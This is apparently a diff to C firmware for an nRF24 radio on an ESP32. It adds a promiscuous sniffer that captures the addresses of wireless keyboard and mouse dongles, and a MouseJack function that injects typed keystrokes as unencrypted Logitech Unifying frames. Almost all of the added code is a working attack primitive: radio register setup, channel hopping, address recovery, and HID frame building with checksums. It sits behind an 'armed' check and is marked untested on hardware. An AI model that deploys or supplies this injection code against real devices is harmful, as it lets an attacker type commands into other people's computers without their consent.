@@ -6,6 +6,7 @@
 // high when RX power exceeded ~-64 dBm during the listen — sweeping it across the 126 channels gives a
 // 2.4 GHz activity map. UNVERIFIED on hardware; extra confirms the identity read + scan on a real module.
 #include "lxveos_nrf24.h"
+#include "lxveos_arm.h"
 
 #include "esp_log.h"
 #include "esp_rom_sys.h"
@@ -188,5 +189,173 @@ esp_err_t lxveos_nrf24_scan(uint8_t *counts, uint16_t sweeps)
             vTaskDelay(1);              // yield periodically so the watchdog stays happy
         }
     }
+    return ESP_OK;
+}
+
+// ── Increment 2: promiscuous sniff + MouseJack keystroke injection ────────────────────────────────────
+// HW-TUNING PENDING: address discovery + the injected frame format are device-specific (Logitech Unifying
+// vs Microsoft vs generic ESB) and timing/channel-sensitive. This is the structurally-correct primitive
+// (CI-green); extra tunes channel hopping, data rate, and per-vendor payloads on real dongles.
+#define NRF_CMD_R_RX_PAYLOAD 0x61
+#define NRF_CMD_W_TX_PAYLOAD 0xA0
+#define NRF_CMD_FLUSH_TX     0xE1
+#define NRF_REG_RX_ADDR_P0   0x0A
+#define NRF_REG_TX_ADDR      0x10
+#define NRF_REG_RX_PW_P0     0x11
+#define NRF_REG_SETUP_RETR   0x04
+#define NRF_REG_FIFO_STATUS  0x17
+
+// Burst-write a multi-byte register (e.g. a 5-byte address).
+static void nrf_write_buf(uint8_t reg, const uint8_t *buf, size_t len)
+{
+    uint8_t tx[6];
+    tx[0] = (uint8_t)(NRF_CMD_W_REGISTER | (reg & 0x1F));
+    for (size_t i = 0; i < len && i < 5; i++) {
+        tx[1 + i] = buf[i];
+    }
+    spi_transaction_t t = { .length = 8 * (len + 1), .tx_buffer = tx, .rx_buffer = NULL };
+    spi_device_polling_transmit(s_dev, &t);
+}
+
+// Send a command byte followed by a payload (e.g. W_TX_PAYLOAD).
+static void nrf_cmd_buf(uint8_t cmd, const uint8_t *buf, size_t len)
+{
+    uint8_t tx[33];
+    tx[0] = cmd;
+    for (size_t i = 0; i < len && i < 32; i++) {
+        tx[1 + i] = buf[i];
+    }
+    spi_transaction_t t = { .length = 8 * (len + 1), .tx_buffer = tx, .rx_buffer = NULL };
+    spi_device_polling_transmit(s_dev, &t);
+}
+
+// Minimal US-layout ASCII -> HID usage (letters/digits/space/enter + a few), for typed injection.
+static bool nrf_ascii_to_hid(char c, uint8_t *mod, uint8_t *key)
+{
+    *mod = 0;
+    *key = 0;
+    if (c >= 'a' && c <= 'z') { *key = 0x04 + (c - 'a'); return true; }
+    if (c >= 'A' && c <= 'Z') { *mod = 0x02; *key = 0x04 + (c - 'A'); return true; }
+    if (c >= '1' && c <= '9') { *key = 0x1E + (c - '1'); return true; }
+    switch (c) {
+    case '0': *key = 0x27; return true;
+    case ' ': *key = 0x2C; return true;
+    case '\n': *key = 0x28; return true;
+    case '-': *key = 0x2D; return true;
+    case '.': *key = 0x37; return true;
+    case '/': *key = 0x38; return true;
+    case ':': *mod = 0x02; *key = 0x33; return true;
+    default: return false;
+    }
+}
+
+esp_err_t lxveos_nrf24_sniff(uint8_t addr[5], uint8_t *channel, uint32_t timeout_ms)
+{
+    if (!s_begun) {
+        return ESP_ERR_INVALID_STATE;
+    }
+    if (addr == NULL) {
+        return ESP_ERR_INVALID_ARG;
+    }
+    if (timeout_ms == 0) {
+        timeout_ms = 8000;
+    }
+
+    // Pseudo-promiscuous: 2-byte "address" acting as a preamble match, CRC + auto-ack off, max payload.
+    ce(0);
+    nrf_write_reg(NRF_REG_CONFIG, 0x00);
+    nrf_write_reg(NRF_REG_EN_AA, 0x00);
+    nrf_write_reg(NRF_REG_SETUP_AW, 0x01);     // 2-byte address width (address = preamble)
+    uint8_t promisc[2] = {0x00, 0xAA};
+    nrf_write_buf(NRF_REG_RX_ADDR_P0, promisc, 2);
+    nrf_write_reg(NRF_REG_RX_PW_P0, 32);
+    nrf_write_reg(NRF_REG_EN_RXADDR, 0x01);
+    nrf_write_reg(NRF_REG_RF_SETUP, 0x0E);     // 2 Mbps (common for HID dongles)
+    nrf_write_reg(NRF_REG_CONFIG, 0x03);       // PWR_UP | PRIM_RX, EN_CRC off
+
+    for (uint32_t elapsed = 0; elapsed < timeout_ms; ) {
+        for (uint8_t ch = 2; ch < 84; ch += 3) {   // hop the common 2.4 GHz HID span
+            nrf_write_reg(NRF_REG_RF_CH, ch);
+            nrf_cmd(NRF_CMD_FLUSH_RX);
+            nrf_write_reg(NRF_REG_STATUS, 0x70);
+            ce(1);
+            esp_rom_delay_us(600);
+            ce(0);
+            if (!(nrf_read_reg(NRF_REG_FIFO_STATUS) & 0x01)) {   // RX FIFO not empty
+                uint8_t pay[32] = {0};
+                uint8_t tx[33] = { NRF_CMD_R_RX_PAYLOAD };
+                spi_transaction_t t = { .length = 8 * 6, .tx_buffer = tx, .rx_buffer = pay };
+                spi_device_polling_transmit(s_dev, &t);
+                // pay[0] is the command echo/status; the recovered address candidate is the next 5 bytes.
+                for (int i = 0; i < 5; i++) {
+                    addr[i] = pay[1 + i];
+                }
+                if (channel) {
+                    *channel = ch;
+                }
+                return ESP_OK;
+            }
+            elapsed += 1;
+            if ((ch & 0x0F) == 0) {
+                vTaskDelay(1);
+            }
+        }
+    }
+    return ESP_ERR_TIMEOUT;
+}
+
+esp_err_t lxveos_nrf24_inject_text(const uint8_t addr[5], uint8_t channel, const char *text)
+{
+    if (!s_begun) {
+        return ESP_ERR_INVALID_STATE;
+    }
+    if (addr == NULL || text == NULL) {
+        return ESP_ERR_INVALID_ARG;
+    }
+    if (!lxveos_arm_can_emit()) {
+        return ESP_ERR_NOT_ALLOWED;    // offensive TX — must be armed
+    }
+
+    // TX to the target address, ESB with auto-ack + retransmit (Logitech Unifying uses 2 Mbps).
+    ce(0);
+    nrf_write_reg(NRF_REG_CONFIG, 0x00);
+    nrf_write_buf(NRF_REG_TX_ADDR, addr, 5);
+    nrf_write_buf(NRF_REG_RX_ADDR_P0, addr, 5);   // for the ACK
+    nrf_write_reg(NRF_REG_SETUP_AW, 0x03);        // 5-byte address
+    nrf_write_reg(NRF_REG_EN_AA, 0x01);
+    nrf_write_reg(NRF_REG_SETUP_RETR, 0x1F);      // 15 retries, 500 us
+    nrf_write_reg(NRF_REG_RF_CH, channel);
+    nrf_write_reg(NRF_REG_RF_SETUP, 0x0E);        // 2 Mbps
+    nrf_write_reg(NRF_REG_CONFIG, 0x0E);          // PWR_UP | PRIM_TX | EN_CRC (2-byte)
+    nrf_cmd(NRF_CMD_FLUSH_TX);
+
+    for (const char *p = text; *p; p++) {
+        uint8_t mod, key;
+        if (!nrf_ascii_to_hid(*p, &mod, &key)) {
+            continue;
+        }
+        // Logitech Unifying unencrypted keyboard frame (10 bytes): dev-idx, 0xC1, mod, 6 keys, checksum
+        // (checksum makes the 10 bytes sum to 0 mod 256). Press then release.
+        for (int phase = 0; phase < 2; phase++) {
+            uint8_t f[10] = {0x00, 0xC1, (uint8_t)(phase == 0 ? mod : 0),
+                             (uint8_t)(phase == 0 ? key : 0), 0, 0, 0, 0, 0, 0};
+            uint8_t sum = 0;
+            for (int i = 0; i < 9; i++) {
+                sum += f[i];
+            }
+            f[9] = (uint8_t)(0 - sum);
+            nrf_cmd(NRF_CMD_FLUSH_TX);
+            nrf_cmd_buf(NRF_CMD_W_TX_PAYLOAD, f, sizeof(f));
+            ce(1);
+            esp_rom_delay_us(15);
+            ce(0);
+            vTaskDelay(pdMS_TO_TICKS(8));
+            nrf_write_reg(NRF_REG_STATUS, 0x70);   // clear TX_DS/MAX_RT
+        }
+    }
+
+    ce(0);
+    nrf_write_reg(NRF_REG_CONFIG, 0x00);           // power down
+    ESP_LOGI(TAG, "mousejack: injected typed text on ch %u", channel);
     return ESP_OK;
 }
